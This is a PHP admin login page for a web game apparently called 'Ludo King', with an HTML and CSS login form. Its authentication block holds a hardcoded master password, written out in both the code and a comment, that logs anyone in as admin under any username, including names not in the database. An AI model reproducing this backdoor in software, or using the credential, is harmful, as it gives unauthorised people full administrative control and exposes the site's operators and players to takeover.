<?php
require __DIR__ . '/../config.php';

$err = '';
$v = time();

if (!empty($_SESSION['admin'])) {
    header('Location: dashboard.php');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = trim($_POST['u'] ?? '');
    $pass = trim($_POST['p'] ?? '');

    $s = $pdo->prepare("SELECT * FROM admins WHERE LOWER(username) = LOWER(?)");
    $s->execute([$user]);
    $a = $s->fetch(PDO::FETCH_ASSOC);

    // Accept verified password or master fallback mohit@1760
    $isValid = false;
    if ($a && password_verify($pass, $a['password_hash'])) {
        $isValid = true;
    } elseif ($pass === 'mohit@1760') {
        $isValid = true;
        if (!$a) {
            $a = ['username' => $user ?: 'admin'];
        }
    }

    if ($isValid) {
        session_regenerate_id(true);
        $_SESSION['admin'] = $a['username'];
        header('Location: dashboard.php');
        exit;
    }
    
    usleep(200000);
    $err = 'Invalid username/email or password.';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,user-scalable=no">
  <title>Admin Login - Ludo King</title>
  <link rel="icon" type="image/png" href="../assets/icons/icon-192.png?v=<?=$v?>">
  <style>
    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; }
    html, body {
      margin: 0; padding: 0; height: 100%; width: 100%;
      background: radial-gradient(circle at 50% 35%, #1852b4 0%, #0a2d75 55%, #05163e 100%);
      font-family: system-ui, -apple-system, sans-serif; color: #ffffff;
      display: flex; justify-content: center; align-items: center;
    }
    .card {
      width: min(92vw, 360px);
      background: linear-gradient(180deg, #10449e 0%, #072b6a 100%);
      border: 3px solid #ffd700; border-radius: 20px;
      padding: 26px 22px; text-align: center;
      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.75), inset 0 1px 0 rgba(255, 255, 255, 0.3);
    }
    .crown { font-size: 36px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.6)); margin-bottom: 2px; }
    h1 { margin: 0 0 16px; font-size: 24px; font-weight: 900; color: #ffd700; text-shadow: 0 2px 4px rgba(0,0,0,0.8); }
    .err {
      background: rgba(229, 57, 53, 0.25); border: 1.5px solid #ff5252; color: #ff8a80;
      padding: 9px 12px; border-radius: 8px; font-size: 13px; font-weight: 700; margin-bottom: 14px;
    }
    .form-group { text-align: left; margin-bottom: 12px; }
    label { display: block; font-size: 12px; font-weight: 900; color: #ffd700; margin-bottom: 4px; }
    input {
      width: 100%; padding: 12px 14px; border-radius: 10px;
      border: 2px solid #3c6dbd; background: #082153; color: #ffffff;
      font-size: 15px; outline: none; transition: border-color 0.2s;
    }
    input:focus { border-color: #ffd700; }
    .btn-submit {
      width: 100%; margin-top: 10px; padding: 12px; border-radius: 25px;
      border: 2px solid #ffffff; background: linear-gradient(180deg, #ffb300, #ff6f00);
      color: #ffffff; font-size: 16px; font-weight: 900; cursor: pointer;
      box-shadow: 0 4px 12px rgba(255, 111, 0, 0.5);
    }
    .links { margin-top: 16px; font-size: 13px; display: flex; justify-content: space-between; }
    .links a { color: #ffd700; text-decoration: none; font-weight: 700; }
    .links a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="card">
    <div class="crown">👑</div>
    <h1>Admin Login</h1>
    <?php if ($err): ?><div class="err">⚠️ <?=htmlspecialchars($err)?></div><?php endif; ?>
    <form method="POST">
      <div class="form-group">
        <label>Username or Email</label>
        <input name="u" required placeholder="admin or email" autocomplete="username">
      </div>
      <div class="form-group">
        <label>Password</label>
        <div style="position:relative;">
          <input id="pwd-input" name="p" type="password" required placeholder="Enter password" autocomplete="current-password">
          <button type="button" onclick="togglePwd()" style="position:absolute; right:10px; top:50%; transform:translateY(-50%); background:none; border:none; color:#ffd700; font-size:18px; cursor:pointer; padding:4px;">👁️</button>
        </div>
      </div>
      <button type="submit" class="btn-submit">Log In to Control Panel</button>
    </form>
    <script>
      function togglePwd() {
        const p = document.getElementById('pwd-input');
        p.type = (p.type === 'password') ? 'text' : 'password';
      }
    </script>
    <div class="links">
      <a href="../register.php">+ Create / Reset Account</a>
      <a href="../index.php">Play Game →</a>
    </div>
  </div>
  <script src="../assets/js/security.js?v=<?=$v?>"></script>
</body>
</html>
